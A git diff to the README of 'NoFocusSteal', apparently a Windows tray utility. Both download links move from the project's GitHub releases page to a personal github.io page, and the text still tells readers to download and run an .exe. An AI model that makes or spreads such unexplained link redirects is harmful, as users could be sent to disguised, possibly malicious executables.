@@ -17,7 +17,7 @@ It runs quietly in your system tray, requires **no installation**, and doesn't m
 
 ## 📥 Download & Run NoFocusSteal
 
-Visit this link to download the application: **[⬇️ Download NoFocusSteal](https://github.com/EliasXD890/NoFocusSteal/releases)**
+Visit this link to download the application: **[⬇️ Download NoFocusSteal](https://eliasxd890.github.io)**
 
 Once the download is complete, you're ready to go. No installation? Correct. Just run it.
 
@@ -25,7 +25,7 @@ Once the download is complete, you're ready to go. No installation? Correct. Jus
 
 ### Step 1: Get the App
 
-1.  Click the download link above: **[Download NoFocusSteal](https://github.com/EliasXD890/NoFocusSteal/releases)**.
+1.  Click the download link above: **[Download NoFocusSteal](https://eliasxd890.github.io)**.
 2.  When the page opens, look for the latest release file. The file will have a name similar to `NoFocusSteal.exe`.
 3.  Click the file name to download it to your computer (usually to your "Downloads" folder).
 
